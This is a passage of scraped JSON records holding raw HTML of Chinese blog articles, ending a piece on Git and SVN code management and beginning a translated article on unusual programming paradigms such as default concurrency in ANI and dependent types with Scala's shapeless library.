src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/5-2.png\" alt=\"\" width=\"975\" height=\"642\"></a></p>\n<p>由于Android源代码由上百个独立的代码库组成，并且编译一个Android系统需要大部分代码库里面的代码，所以如何管理如此多的代码库也是一个难题，比如如何一次性同步需要编译一个需要支持特定设备的代码库组合。为此Google基于Python语言开发一个工具叫Repo ，这个工具可以自定义你需要的代码库的组合，并且一次性对这些代码库进行同步，比如pull和push，见下图。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/6-1.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/6-1.png\" alt=\"\" width=\"975\" height=\"756\"></a></p>\n<h3>四、SVN到Git的迁移</h3>\n<p>对于想从集中式代码管理系统迁移到分布式代码管理系统的团队来讲，如果团队规模小，那么问题一般都不大，但是对于大型分布式团队却是困难重重。最主要的两个困难：</p>\n<ol>\n<li>代码量太大，很难一次性将所有的代码和日志等在短时间内迁移成功。</li>\n<li>由于下属团队太多，很难同一时间让所有团队都切换至新的代码管理工具。</li>\n</ol>\n<p>为了解决这些难题，一般都会首先选用1个团队来使用新的代码版本管理工具。如果这个团队转换成功，再将其作为标杆向其他团队推广，从而逐步的将所有团队切换到新的工具上去。</p>\n<p>SVN到Git的迁移方案一般主要会使用两种工具：</p>\n<ol>\n<li>开源免费的git-svn；</li>\n<li>商业收费的Subgit。</li>\n</ol>\n<p>其中使用Subgit的迁移方案如下图：</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/7-1.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/7-1.png\" alt=\"\" width=\"975\" height=\"646\"></a></p>\n<p>如果团队组资源充足，还可以使用Gerrit搭建一个独立的Git服务器，从而以分布式的方式进行代码迁移，如下图：</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/8.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/8.png\" alt=\"\" width=\"975\" height=\"675\"></a></p>\n<h3>五、多产品线的管理</h3>\n<p>使用同一个中心代码库管理多产品线一直是大型项目的一个困难点，特别是使用SVN这样的工具更是难以管理，因为SVN这种工具的Branch本质上是一个目录拷贝，并且速度慢，而且代码回迁也需要手动进行。但是如果使用Git的特性来管理多产品线，比起SVN是事半功倍。具体方案见下图：</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/9.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/05/9.png\" alt=\"\" width=\"975\" height=\"569\"></a></p>\n<h3>总结：</h3>\n<p>分布式代码版本管理系统并不一定适合所有团队，比如中小团队可能更关心的只是成本更低，简单易用，那么SVN等这类集中式版本管理工具还是更为适合。但是不管团队最终选用什么代码版本管理工具，只要适合自己的团队的开发流程和工作方式，并且代码管理顺畅就可以了。</p>\n<div></div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111291\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111291votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111291\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">\r\n\t\t\t<img src=\"http://tp3.sinaimg.cn/1774908135/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            ThoughtWorks是一家全球IT咨询公司，追求卓越软件质量，致力于科技驱动商业变革。擅长构建定制化软件产品，帮助客户快速将概念转化为价值。同时为客户提供用户体验设计、技术战略咨询、组织转型等咨询服务。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/thoughtworkschina\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/thoughtworkschina/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 60</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://insights.thoughtworkers.org/\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/thoughtworkschina\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://insights.thoughtworkers.org/wp-content/uploads/2017/05/0-1.png"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/05/26", "praise_nums": 1}
{"tags": "编程,开发", "front_image_path": "full/378869acdf1423acc6fcf04b341a00c25e7fb117.jpg", "title": "6 个编程范型将改变你对编程的看法", "url_object_id": "bc41ccf93755b05f04046b5f0ef8c8f2", "url": "http://blog.jobbole.com/111165/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.ybrikman.com/writing/2014/04/09/six-programming-paradigms-that-will/\">ybrikman</a>   译文出处：<a target=\"_blank\" href=\"https://my.oschina.net/editorial-story/blog/890965\">开源中国/局长</a>   </div><p>每时每刻我都在琢磨一种编程语言所做的一些与众不同的事情，这改变了我对编程的思考。在这篇文章中，我想分享一些我最喜欢的发现。</p>\n<p>这不是那种“函数式编程将改变世界”的博客文章：这篇文章的内容会更加深奥。我敢打赌大多数读者都没有听过下面的编程语言和范型，所以我希望你像我一样有很大的兴趣来学习这些新概念。</p>\n<p>注意：对于下面的大多数语言我拥有的经验很少：我只是发现它们背后的思想十分有魅力，但对于它们我没有任何专业知识，所以有任何更正和错误请指出。另外，如果你发现这里存在没有提到的任何新的范型和想法，欢迎把它们分享出来。</p>\n<p><em>更新：这篇文章上了 <a href=\"http://www.reddit.com/r/programming/comments/22nhb2/six_programming_paradigms_that_will_change_how/\" target=\"_blank\" rel=\"nofollow\">r/programming</a> 和 <a href=\"https://news.ycombinator.com/item?id=7565153\" target=\"_blank\" rel=\"nofollow\">HN</a> 的首页。感谢反馈，我已经添加了一些修正。</em></p>\n<h3><strong>默认支持并发（Concurrent by default）</strong></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/893809b18796c9cecaac388d73d8fc08.jpg\" alt=\"\" width=\"512\" height=\"416\"></p>\n<p>示例语言：<a href=\"https://code.google.com/p/anic/\" target=\"_blank\" rel=\"nofollow\">ANI</a>, <a href=\"http://www.cs.cmu.edu/~aldrich/plaid/\" target=\"_blank\" rel=\"nofollow\">Plaid</a></p>\n<p>让我们先从改变思维方式开始吧：有一些编程语言默认情况下就是支持并发的。也就是说，每行代码都是并行执行的。</p>\n<p>例如，假设你写了三行代码 A，B 和 C：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e2e539119825\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nA;\r\nB;\r\nC;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e2e539119825-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e2e539119825-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e2e539119825-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e2e539119825-1\"><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e2e539119825-2\"><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e2e539119825-3\"><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>在大多数编程语言中，A 会先执行，然后执行 B，最后执行 C。但在像 <a href=\"https://code.google.com/p/anic/\" target=\"_blank\" rel=\"nofollow\">ANI</a> 这样的语言中，A, B, 和 C 都将同时执行。</p>\n<p><a href=\"https://code.google.com/p/anic/\" target=\"_blank\" rel=\"nofollow\">ANI</a> 语言中代码行之间的控制流或排序只是代码行之间显式依赖的副作用。例如，如果 B 具有对 A 中定义的变量的引用，则 A 和 C 将同时执行，并且 B 将在 A 完成之后执行。</p>\n<p>来看一下 ANI 中的一个例子。如<a href=\"https://code.google.com/p/anic/wiki/Tutorial\" target=\"_blank\" rel=\"nofollow\">教程</a>中所述，ANI 程序由用于操作流和数据流的“管道”和“锁存器”组成。这种非同一般的语法很难解析，而且这门语言似乎已经死了，不过这些概念还是非常有趣的。</p>\n<p>这是 ANI 中的“Hello World”示例：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e38570611895\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\"Hello, World!\" -&gt;std.out</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e38570611895-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e38570611895-1\"><span class=\"crayon-s\">\"Hello, World!\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">std</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在 ANI 语法中，我们将 <code>\"Hello, World!\"</code> 对象（一个字符串）发送到 <code>std.out</code> 流。如果我们发送另一个字符串到 <code>std.out</code> 会怎么样？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e3e251809913\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\"Hello, World!\" -&gt;std.out\r\n\"Goodbye, World!\" -&gt;std.out</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e3e251809913-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e3e251809913-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e3e251809913-1\"><span class=\"crayon-s\">\"Hello, World!\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">std</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">out</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e3e251809913-2\"><span class=\"crayon-s\">\"Goodbye, World!\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">std</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这两行代码并行执行，所以它们可能在控制台以任何顺序结束。现在，看看当我们某行代码中引入一个变量并在之后引用会发生什么情况：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e42497296784\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ns = [string];\r\n\"Hello, World!\" -&gt;s;\r\ns -&gt;std.out;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e42497296784-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef41e42497296784-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e42497296784-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e42497296784-1\"><span class=\"crayon-v\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-t\">string</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef41e42497296784-2\"><span class=\"crayon-s\">\"Hello, World!\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef41e42497296784-3\"><span class=\"crayon-v\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">std</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>第一行声明了一个名为 <code>s</code> 的 “锁存器”（锁存器有一点像变量），其中包含一个字符串；第二行将 <code>\"Hello, World!\"</code> 发送到 <code>s</code>，第三行“解锁” <code>s</code> 并将内容发送到 <code>std.out</code>。因此，可以看到 ANI 的隐形程序排序：由于每一行的运行都取决于前一行，因此这里的代码将会按照编写的顺序执行。</p>\n<p><a href=\"http://www.cs.cmu.edu/~aldrich/plaid/\" target=\"_blank\" rel=\"nofollow\">Plaid 语言</a>也声称默认情况下支持并发，但使用的是<a href=\"http://www.cs.cmu.edu/~aldrich/papers/onward2009-concurrency.pdf\" target=\"_blank\" rel=\"nofollow\">这篇论文</a>中所描述的一种权限模型来构建控制流。Plaid 还探索了其他有趣的概念，例如 <a href=\"http://www.cs.cmu.edu/~aldrich/papers/onward2009-state.pdf\" target=\"_blank\" rel=\"nofollow\">Typestate-Oriented Programming</a>（面向类型状态编程），其中状态更改成为语言的重要因素：你定义的对象不再是作为类，而是可以由编译器检查的一系列状态和转换。看起来这十分有趣，正如 Rich Hickey 的 <a href=\"http://www.infoq.com/presentations/Are-We-There-Yet-Rich-Hickey\" target=\"_blank\" rel=\"nofollow\">Are we there yet</a> 讲话中所讨论的将时间作为语言结构的首要因素。</p>\n<p>Multicore 正处在上升期，并发性仍然比大多数语言更难。ANI 和 Plaid 对于这个可能产生惊人的性能提升的问题提供了一个新的思路；不过问题是“默认支持并行”是否让并发更容易或难以管理。</p>\n<p><em>更新：上面的描述讲解了 ANI 和 Plaid 的基本本质，但我互换地使用了术语“并发”和“并行”，事实上它们具有不同的含义。有关更多信息，请参阅 <a href=\"http://vimeo.com/49718712\" target=\"_blank\" rel=\"nofollow\">Concurrency Is Not Parallelism</a> （并发不是并行）这篇文章。</em></p>\n<p> </p>\n<h3><strong>依赖类型（Dependent types）</strong></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/aca78d9187e2083ce110a8992ca12f83.png\" alt=\"\" width=\"384\" height=\"108\"></p>\n<p>示例语言：<a href=\"http://www.idris-lang.org/\" target=\"_blank\" rel=\"nofollow\">Idris</a>, <a href=\"http://wiki.portal.chalmers.se/agda/pmwiki.php\" target=\"_blank\" rel=\"nofollow\">Agda</a>, <a href=\"http://en.wikipedia.org/wiki/Coq\" target=\"_blank\" rel=\"nofollow\">Coq</a></p>\n<p>你可能已经习惯 C 和 Java 等语言的类型系统，编译器可以检查一个变量是整数、列表还是字符串。但如果你的编译器可以检查变量是“正整数”、“长度为 2  的列表”，还是“一个回文字符串”，那又会怎么样呢？</p>\n<p>这是支持<a href=\"http://en.wikipedia.org/wiki/Dependent_type\" target=\"_blank\" rel=\"nofollow\">依赖类型</a>的语言背后的思想：你可以在编译时指定检查变量值的类型。Scala 的 <a href=\"https://github.com/milessabin/shapeless\" target=\"_blank\" rel=\"nofollow\">shapeless 库</a>增加了对 Scala 依赖类型的部分实验支持（尚未正式支持），并提供了简单的方法来查看示例。</p>\n<p>这里是如何声明一个 <code>Vector</code> 的代码，其中使用了 shapeless 库，包含值 1，2，3：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e47842566225\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nval l1 = 1 :#: 2 :#: 3 :#: VNil</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05ef41e47842566225-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef41e47842566225-1\"><span class=\"crayon-e\">val </span><span class=\"crayon-v\">l1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-p\">#: 2 :#: 3 :#: VNil</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这里创建了一个变量 <code>l1</code>，它的类型签名不仅指定它是一个包含 <code>Ints</code> 的 <code>Vector</code>，而且还指定它是一个长度为 3 的 <code>Vector</code>。编译器可以使用此信息来捕获错误。让我们使用 <code>Vector</code> 中的 <code>vAdd</code> 方法来执行两个 <code>Vectors</code>之间的成对加法（pairwise addition）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05ef41e4d534640220\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" 